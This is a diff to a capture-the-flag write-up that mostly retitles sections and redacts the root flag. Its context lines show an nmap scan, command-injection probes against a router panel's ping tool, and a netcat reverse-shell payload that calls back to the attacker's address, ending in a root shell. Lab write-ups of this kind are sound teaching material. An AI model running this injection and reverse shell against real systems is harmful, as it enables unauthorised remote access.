@@ -2,9 +2,11 @@
 ```sh
 export IP= M-ip
 ```
-# Information Gathering: 
-
+# Enumeration: 
+```sh
 nmap -sV -sC -A  $IP
+```
+
 ```sh
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-05 00:25 CEST
 Nmap scan report for 10.10.155.144
@@ -37,7 +39,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 40.53 seconds
 ```
 Now, we have some services that are running in the machine.
-# Enumerating this services: 
+# Enumerating the services: 
 
 ![Screenshot_22](https://github.com/a-9-k/Rooms-Write_Up-THM/assets/53786047/7c256c8a-fad5-4434-867a-f278095acd9d)
 
@@ -92,6 +94,8 @@ Let’s visit the directory /myrouterpanel.
 by seeing this ping tool it obvious that we have a command injection vuln
 $(ls) !ls ;ls .....
 I managed to get this injection to get me a reverse shell 
+
+# Initial Access:
 
 ```sh
 127.0.0.1 -c `nc 10.8.46.178 9001 -e /bin/sh`
@@ -189,5 +193,5 @@ athena@routerpanel:/mnt/.../secret$ cd /root/
 athena@routerpanel:/root$ ls
 fsociety00.dat  root.txt
 athena@routerpanel:/root$ cat root.txt 
-aecd4a3497cd2ec4bc71a2315030bd48
+aecd4a3497cdflag
 ```
